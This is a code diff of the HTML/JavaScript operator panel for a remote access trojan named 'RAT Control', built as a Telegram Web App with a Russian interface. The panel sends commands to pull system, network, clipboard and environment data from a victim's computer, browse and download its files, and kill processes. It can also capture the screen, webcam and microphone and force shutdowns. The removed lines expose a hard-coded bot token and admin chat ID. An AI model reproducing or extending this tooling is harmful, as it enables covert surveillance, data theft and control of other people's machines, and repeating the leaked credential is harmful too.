@@ -4,6 +4,7 @@
     <title>RAT Control</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -16,7 +17,6 @@
             background: #f5f5f5;
             color: #333;
             padding: 16px;
-            padding-bottom: 80px;
         }
 
         .header {
@@ -25,417 +25,318 @@
             margin: -16px -16px 20px -16px;
             padding: 20px 16px;
             border-radius: 0 0 20px 20px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-
-        .header h1 { font-size: 24px; margin-bottom: 4px; }
-        .header p { font-size: 14px; opacity: 0.9; }
-
-        .tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-            background: white;
-            padding: 8px;
-            border-radius: 30px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
-
-        .tab {
-            flex: 1;
-            text-align: center;
-            padding: 10px;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #666;
-        }
-
-        .tab.active {
-            background: #0088cc;
-            color: white;
-            box-shadow: 0 2px 8px rgba(0,136,204,0.3);
-        }
-
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
 
         .card {
             background: white;
             border-radius: 16px;
             padding: 16px;
-            margin-bottom: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            margin-bottom: 16px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
 
         .card-title {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
-            margin-bottom: 12px;
             color: #0088cc;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            margin-bottom: 12px;
         }
 
-        .action-bar {
-            display: flex;
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
             gap: 8px;
             margin-bottom: 16px;
-            flex-wrap: wrap;
         }
 
-        .action-btn {
+        .button {
             background: #0088cc;
             color: white;
             border: none;
-            border-radius: 12px;
-            padding: 12px 20px;
+            border-radius: 10px;
+            padding: 12px;
             font-size: 14px;
-            font-weight: 500;
             cursor: pointer;
-            flex: 1;
-            min-width: 100px;
-            transition: all 0.2s;
+            transition: 0.2s;
         }
 
-        .action-btn:active { transform: scale(0.97); opacity: 0.8; }
-        .action-btn.secondary { background: #e0e0e0; color: #333; }
-        .action-btn.danger { background: #dc3545; }
-        .action-btn.warning { background: #ffc107; color: #333; }
+        .button:active {
+            transform: scale(0.95);
+            opacity: 0.8;
+        }
+
+        .button.secondary {
+            background: #6c757d;
+        }
 
         .output {
-            background: #f0f0f0;
-            border-radius: 12px;
+            background: #f8f9fa;
+            border-radius: 10px;
             padding: 16px;
-            font-family: 'Courier New', monospace;
+            font-family: monospace;
             font-size: 13px;
             line-height: 1.6;
             white-space: pre-wrap;
-            word-break: break-word;
             max-height: 400px;
             overflow-y: auto;
-            border: 1px solid #ddd;
-        }
-
-        .file-list {
-            margin-top: 12px;
-            max-height: 400px;
-            overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 12px;
+            border: 1px solid #dee2e6;
         }
 
         .file-item {
             display: flex;
-            align-items: center;
-            padding: 12px;
+            padding: 8px;
             border-bottom: 1px solid #eee;
             cursor: pointer;
-            transition: background 0.2s;
         }
 
-        .file-item:hover { background: #f0f0f0; }
-        .file-item:last-child { border-bottom: none; }
-        .file-icon { width: 30px; font-size: 18px; }
-        .file-name { flex: 1; font-weight: 500; margin-right: 10px; word-break: break-word; }
-        .file-size { color: #666; font-size: 12px; margin-right: 10px; white-space: nowrap; }
-        .file-date { color: #666; font-size: 12px; white-space: nowrap; }
-
-        .proc-header {
-            display: flex;
-            padding: 10px;
-            background: #0088cc;
-            color: white;
-            border-radius: 8px 8px 0 0;
-            font-weight: 600;
-            font-size: 13px;
+        .file-item:hover {
+            background: #f0f0f0;
         }
 
-        .proc-row {
-            display: flex;
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            font-size: 12px;
+        .file-icon {
+            width: 30px;
         }
 
-        .proc-pid { width: 60px; }
-        .proc-name { flex: 1; }
-        .proc-cpu { width: 60px; text-align: right; }
-        .proc-ram { width: 60px; text-align: right; }
+        .file-name {
+            flex: 1;
+        }
+
+        .file-size {
+            color: #666;
+        }
 
         .status {
             position: fixed;
-            bottom: 80px;
+            bottom: 20px;
             left: 16px;
             right: 16px;
-            background: white;
+            background: #333;
+            color: white;
+            padding: 12px;
             border-radius: 30px;
-            padding: 12px 20px;
-            font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
             display: none;
-            align-items: center;
-            gap: 8px;
-            z-index: 1000;
         }
 
-        .status.show { display: flex; }
-        .status.success { background: #d4edda; color: #155724; }
-        .status.error { background: #f8d7da; color: #721c24; }
-        .status.warning { background: #fff3cd; color: #856404; }
+        .status.show {
+            display: block;
+        }
 
         .path-bar {
-            background: #f0f0f0;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 12px;
+            background: #e9ecef;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
             font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
         }
 
         .input-group {
             display: flex;
             gap: 8px;
-            margin: 12px 0;
+            margin: 10px 0;
         }
 
         .input {
             flex: 1;
             padding: 12px;
-            border-radius: 12px;
             border: 1px solid #ddd;
-            background: white;
-            color: #333;
+            border-radius: 8px;
             font-size: 14px;
-            outline: none;
         }
-
-        .input:focus { border-color: #0088cc; }
-
-        .bottom-bar {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: white;
-            padding: 12px 16px;
-            border-top: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .bottom-bar button {
-            background: #0088cc;
-            color: white;
-            border: none;
-            border-radius: 12px;
-            padding: 10px 24px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-
-        .bottom-bar span { color: #666; font-size: 13px; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>🤖 RAT CONTROL</h1>
-        <p>Управление компьютером через Telegram</p>
+        <p>Управление компьютером</p>
     </div>
 
-    <!-- Вкладки -->
-    <div class="tabs">
-        <div class="tab active" onclick="switchTab('system')">📊 Система</div>
-        <div class="tab" onclick="switchTab('files')">📁 Файлы</div>
-        <div class="tab" onclick="switchTab('processes')">📋 Процессы</div>
-        <div class="tab" onclick="switchTab('media')">🎥 Медиа</div>
+    <!-- ИНФОРМАЦИЯ О СИСТЕМЕ -->
+    <div class="card">
+        <div class="card-title">📊 ИНФОРМАЦИЯ О СИСТЕМЕ</div>
+        <div class="button-grid">
+            <button class="button" onclick="sendRequest('system_info')">🔄 Обновить</button>
+            <button class="button secondary" onclick="sendRequest('cpu_info')">⚙️ CPU</button>
+            <button class="button secondary" onclick="sendRequest('ram_info')">💾 RAM</button>
+            <button class="button secondary" onclick="sendRequest('disk_info')">💿 Диск</button>
+        </div>
+        <div id="systemOutput" class="output">Нажмите кнопку для загрузки</div>
     </div>
 
-    <!-- ==================== СИСТЕМА ==================== -->
-    <div id="tab-system" class="tab-content active">
-        <div class="card">
-            <div class="card-title">📊 ИНФОРМАЦИЯ О СИСТЕМЕ</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="sendRequest('system_info')">🔄 Обновить</button>
-                <button class="action-btn secondary" onclick="sendRequest('cpu_info')">⚙️ CPU</button>
-                <button class="action-btn secondary" onclick="sendRequest('ram_info')">💾 RAM</button>
-                <button class="action-btn secondary" onclick="sendRequest('disk_info')">💿 Диск</button>
-            </div>
-            <div id="systemInfo" class="output">Нажмите кнопку для загрузки</div>
+    <!-- СЕТЬ -->
+    <div class="card">
+        <div class="card-title">🌐 СЕТЬ</div>
+        <div class="button-grid">
+            <button class="button" onclick="sendRequest('network_info')">📡 Информация</button>
+            <button class="button secondary" onclick="sendRequest('wifi_info')">📶 Wi-Fi</button>
         </div>
-
-        <div class="card">
-            <div class="card-title">⚡ УПРАВЛЕНИЕ ПИТАНИЕМ</div>
-            <div class="action-bar">
-                <button class="action-btn warning" onclick="sendPowerCommand('restart')">🔄 Перезагрузка</button>
-                <button class="action-btn danger" onclick="sendPowerCommand('shutdown')">⏻ Выключение</button>
-                <button class="action-btn secondary" onclick="sendPowerCommand('lock')">🔒 Блокировка</button>
-                <button class="action-btn secondary" onclick="sendPowerCommand('sleep')">😴 Сон</button>
-            </div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🌐 СЕТЬ</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="sendRequest('network_info')">📡 Информация</button>
-                <button class="action-btn secondary" onclick="sendRequest('wifi_info')">📶 Wi-Fi</button>
-            </div>
-            <div id="networkInfo" class="output"></div>
-        </div>
-
-        <div class="card">
-            <div class="card-title">🔧 ДОПОЛНИТЕЛЬНО</div>
-            <div class="action-bar">
-                <button class="action-btn secondary" onclick="sendRequest('env_info')">🌍 Переменные</button>
-                <button class="action-btn secondary" onclick="sendRequest('clipboard_info')">📋 Буфер</button>
-                <button class="action-btn secondary" onclick="sendRequest('user_info')">👤 Пользователь</button>
-            </div>
-            <div id="extraInfo" class="output"></div>
-        </div>
+        <div id="networkOutput" class="output"></div>
     </div>
 
-    <!-- ==================== ФАЙЛЫ ==================== -->
-    <div id="tab-files" class="tab-content">
-        <div class="card">
-            <div class="card-title">📁 ФАЙЛОВЫЙ МЕНЕДЖЕР</div>
-            <div class="path-bar" id="currentPath">C:\</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="loadFiles()">📋 Список</button>
-                <button class="action-btn secondary" onclick="goBack()">⬆️ Назад</button>
-                <button class="action-btn secondary" onclick="loadFiles()">🔄 Обновить</button>
-            </div>
-            <div class="input-group">
-                <input type="text" id="folderPath" class="input" placeholder="Путь к папке">
-                <button class="action-btn secondary" onclick="changeDir()">Перейти</button>
-            </div>
-            <div class="input-group">
-                <input type="text" id="fileName" class="input" placeholder="Имя файла">
-                <button class="action-btn" onclick="downloadFile()">📥 Скачать</button>
-            </div>
-            <div id="fileList" class="file-list">
-                <div class="file-item">📁 Загрузка...</div>
-            </div>
+    <!-- ФАЙЛЫ -->
+    <div class="card">
+        <div class="card-title">📁 ФАЙЛЫ</div>
+        <div class="path-bar" id="currentPath">C:\</div>
+        <div class="button-grid">
+            <button class="button" onclick="listFiles()">📋 Список</button>
+            <button class="button secondary" onclick="goBack()">⬆️ Назад</button>
+        </div>
+        <div class="input-group">
+            <input type="text" id="folderPath" class="input" placeholder="Путь к папке">
+            <button class="button secondary" onclick="changeDir()">Перейти</button>
+        </div>
+        <div id="fileList" class="output"></div>
+    </div>
+
+    <!-- ПРОЦЕССЫ -->
+    <div class="card">
+        <div class="card-title">📋 ПРОЦЕССЫ</div>
+        <div class="button-grid">
+            <button class="button" onclick="sendRequest('processes')">📊 Все</button>
+            <button class="button secondary" onclick="sendRequest('top_cpu')">⚡ По CPU</button>
+            <button class="button secondary" onclick="sendRequest('top_ram')">💾 По RAM</button>
+        </div>
+        <div class="input-group">
+            <input type="number" id="pid" class="input" placeholder="PID">
+            <button class="button" onclick="killProcess()">🔪 Убить</button>
+        </div>
+        <div id="processesOutput" class="output"></div>
+    </div>
+
+    <!-- МЕДИА -->
+    <div class="card">
+        <div class="card-title">🎥 МЕДИА</div>
+        <div class="button-grid">
+            <button class="button" onclick="sendMedia('screen')">📸 Скриншот</button>
+            <button class="button" onclick="sendMedia('webcam')">📷 Вебка</button>
+            <button class="button" onclick="sendMedia('mic')">🎤 Микрофон</button>
         </div>
     </div>
 
-    <!-- ==================== ПРОЦЕССЫ ==================== -->
-    <div id="tab-processes" class="tab-content">
-        <div class="card">
-            <div class="card-title">📋 ПРОЦЕССЫ</div>
-            <div class="action-bar">
-                <button class="action-btn" onclick="sendRequest('processes')">📊 Все</button>
-                <button class="action-btn secondary" onclick="sendRequest('top_cpu')">⚡ По CPU</button>
-                <button class="action-btn secondary" onclick="sendRequest('top_ram')">💾 По RAM</button>
-            </div>
-            <div class="input-group">
-                <input type="number" id="pid" class="input" placeholder="PID">
-                <button class="action-btn danger" onclick="killProcess()">🔪 Убить</button>
-            </div>
-            <div style="border: 1px solid #ddd; border-radius: 12px; overflow: hidden;">
-                <div class="proc-header">
-                    <span class="proc-pid">PID</span>
-                    <span class="proc-name">Имя</span>
-                    <span class="proc-cpu">CPU %</span>
-                    <span class="proc-ram">RAM %</span>
-                </div>
-                <div id="processesContent">Нажмите кнопку для загрузки</div>
-            </div>
+    <!-- УПРАВЛЕНИЕ -->
+    <div class="card">
+        <div class="card-title">⚡ УПРАВЛЕНИЕ</div>
+        <div class="button-grid">
+            <button class="button" onclick="sendPower('restart')">🔄 Перезагрузка</button>
+            <button class="button" onclick="sendPower('shutdown')">⏻ Выключение</button>
+            <button class="button secondary" onclick="sendPower('lock')">🔒 Блокировка</button>
+            <button class="button secondary" onclick="sendPower('sleep')">😴 Сон</button>
         </div>
     </div>
 
-    <!-- ==================== МЕДИА ==================== -->
-    <div id="tab-media" class="tab-content">
-        <div class="card">
-            <div class="card-title">🎥 МЕДИА</div>
-            <p style="margin-bottom: 16px; color: #666;">Медиафайлы придут в чат</p>
-            <div class="action-bar">
-                <button class="action-btn" onclick="sendMedia('screen')">📸 Скриншот</button>
-                <button class="action-btn" onclick="sendMedia('webcam')">📷 Вебка</button>
-                <button class="action-btn" onclick="sendMedia('mic')">🎤 Микрофон</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- Статус -->
-    <div id="status" class="status"><span id="statusText"></span></div>
-
-    <!-- Нижняя панель -->
-    <div class="bottom-bar">
-        <span>🟢 Онлайн</span>
-        <button onclick="window.close()">ЗАКРЫТЬ</button>
-    </div>
+    <div id="status" class="status"></div>
 
     <script>
-        const ADMIN_ID = 7266658879;
-        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
         let currentDir = 'C:\\';
+        let pendingRequests = {};
 
-        // ==================== HTTP ЗАПРОСЫ ====================
+        // Функция отправки запроса
         async function sendRequest(action, params = {}) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const requestId = Date.now();
+            const message = JSON.stringify({
+                action: action,
+                params: params,
+                requestId: requestId
+            });
             
-            const message = {
-                chat_id: ADMIN_ID,
-                text: JSON.stringify({
-                    action: action,
-                    params: params,
-                    from_webapp: true
-                })
-            };
+            showStatus('⏳ Отправка запроса...');
             
-            showStatus('⏳ Отправка...', 'warning');
+            // Сохраняем requestId для получения ответа
+            pendingRequests[requestId] = action;
             
+            // Отправляем через Telegram
+            tg.sendData(message);
+        }
+
+        // Получение ответов от бота
+        tg.onEvent('web_app_data', function(data) {
             try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(message)
-                });
+                const response = JSON.parse(data);
+                console.log('📩 Ответ:', response);
                 
-                const data = await response.json();
-                if (data.ok) {
-                    showStatus('✅ Запрос отправлен', 'success');
-                } else {
-                    showStatus('❌ Ошибка', 'error');
+                if (response.requestId && pendingRequests[response.requestId]) {
+                    const action = pendingRequests[response.requestId];
+                    
+                    // Отображаем данные в зависимости от типа запроса
+                    if (action.includes('system') || action.includes('cpu') || action.includes('ram') || action.includes('disk')) {
+                        document.getElementById('systemOutput').innerHTML = formatOutput(response.data);
+                    } else if (action.includes('network') || action.includes('wifi')) {
+                        document.getElementById('networkOutput').innerHTML = formatOutput(response.data);
+                    } else if (action.includes('process')) {
+                        document.getElementById('processesOutput').innerHTML = formatProcesses(response.data);
+                    } else if (action === 'list_files' || action === 'change_dir' || action === 'go_back') {
+                        if (response.data && response.data.files) {
+                            currentDir = response.data.current_dir;
+                            document.getElementById('currentPath').textContent = currentDir;
+                            document.getElementById('fileList').innerHTML = formatFiles(response.data.files);
+                        }
+                    }
+                    
+                    delete pendingRequests[response.requestId];
+                    showStatus('✅ Данные получены');
                 }
-                return data;
-            } catch (error) {
-                showStatus('❌ ' + error.message, 'error');
+            } catch (e) {
+                console.error('Ошибка:', e);
             }
+        });
+
+        // Форматирование вывода
+        function formatOutput(data) {
+            if (!data) return 'Нет данных';
+            if (typeof data === 'string') return data;
+            return JSON.stringify(data, null, 2);
         }
 
-        // ==================== ФАЙЛЫ ====================
-        async function loadFiles() {
-            await sendRequest('list_files', { path: currentDir });
+        // Форматирование файлов
+        function formatFiles(files) {
+            let html = '';
+            files.forEach(f => {
+                const icon = f.is_dir ? '📁' : '📄';
+                html += `<div class="file-item" onclick="downloadFile('${f.name}')">
+                    <span class="file-icon">${icon}</span>
+                    <span class="file-name">${f.name}</span>
+                    <span class="file-size">${f.size}</span>
+                </div>`;
+            });
+            return html;
         }
 
-        async function goBack() {
-            await sendRequest('go_back', { path: currentDir });
+        // Форматирование процессов
+        function formatProcesses(processes) {
+            let html = '';
+            processes.forEach(p => {
+                html += `<div class="file-item">
+                    <span class="file-icon">📊</span>
+                    <span class="file-name">${p.name}</span>
+                    <span class="file-size">CPU: ${p.cpu}% RAM: ${p.ram}%</span>
+                </div>`;
+            });
+            return html;
         }
 
-        async function changeDir() {
+        // Функции для файлов
+        function listFiles() {
+            sendRequest('list_files', { path: currentDir });
+        }
+
+        function goBack() {
+            sendRequest('go_back', { path: currentDir });
+        }
+
+        function changeDir() {
             const path = document.getElementById('folderPath').value;
             if (path) {
-                await sendRequest('change_dir', { current: currentDir, path: path });
-                document.getElementById('folderPath').value = '';
+                sendRequest('change_dir', { current: currentDir, path: path });
             }
         }
 
-        function downloadFile() {
-            const name = document.getElementById('fileName').value;
-            if (name) {
-                sendRequest('get', { path: currentDir + '\\' + name });
-            }
+        function downloadFile(name) {
+            sendRequest('get', { path: currentDir + '\\' + name });
         }
 
-        // ==================== ПРОЦЕССЫ ====================
         function killProcess() {
             const pid = document.getElementById('pid').value;
             if (pid) {
@@ -443,31 +344,19 @@
             }
         }
 
-        // ==================== МЕДИА ====================
-        function sendMedia(type) {
-            sendRequest(type);
+        function sendMedia(action) {
+            sendRequest(action);
         }
 
-        // ==================== ПИТАНИЕ ====================
-        function sendPowerCommand(cmd) {
-            sendRequest(cmd);
+        function sendPower(action) {
+            sendRequest(action);
         }
 
-        // ==================== ВКЛАДКИ ====================
-        function switchTab(tabName) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-            event.target.classList.add('active');
-            document.getElementById(`tab-${tabName}`).classList.add('active');
-        }
-
-        // ==================== СТАТУС ====================
-        function showStatus(text, type = 'info') {
+        function showStatus(text) {
             const status = document.getElementById('status');
-            const statusText = document.getElementById('statusText');
-            status.className = 'status show ' + type;
-            statusText.textContent = text;
-            setTimeout(() => status.classList.remove('show'), 3000);
+            status.textContent = text;
+            status.classList.add('show');
+            setTimeout(() => status.classList.remove('show'), 2000);
         }
     </script>
 </body>
